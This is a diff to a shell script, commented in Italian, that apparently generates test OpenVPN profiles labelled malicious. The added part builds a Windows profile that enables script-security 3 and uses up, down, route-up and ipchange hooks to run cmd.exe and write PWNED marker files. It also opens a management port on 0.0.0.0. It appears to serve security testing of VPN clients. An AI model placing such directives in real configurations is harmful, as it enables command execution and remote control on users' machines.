@@ -39,4 +39,18 @@ EOF
 } > $O/malicious.ovpn
 # Fedora tiene i plugin in /usr/lib64
 sed 's|/usr/lib/x86_64-linux-gnu/openvpn/plugins|/usr/lib64/openvpn/plugins|' $O/malicious.ovpn > $O/malicious-fedora.ovpn
+# profilo malevolo per Windows: stesse direttive, tracce in C:\gl. Nei comandi la barra rovesciata e' un escape e
+# OpenVPN li legge due volte: quattro barre nel profilo = una barra per cmd.exe (che nelle redirezioni non accetta "/")
+{ base $P/client.key; cat <<'EOF'
+script-security 3
+up "C:/Windows/System32/cmd.exe /c echo x > C:\\\\gl\\\\PWNED-up.txt"
+down "C:/Windows/System32/cmd.exe /c echo x > C:\\\\gl\\\\PWNED-down.txt"
+route-up "C:/Windows/System32/cmd.exe /c echo x > C:\\\\gl\\\\PWNED-route-up.txt"
+ipchange "C:/Windows/System32/cmd.exe /c echo x > C:\\\\gl\\\\PWNED-ipchange.txt"
+management 0.0.0.0 7505
+status C:/gl/PWNED-status.txt 1
+writepid C:/gl/PWNED-writepid.txt
+setenv EVIL 1
+EOF
+} > $O/malicious-win.ovpn
 ls -l $O
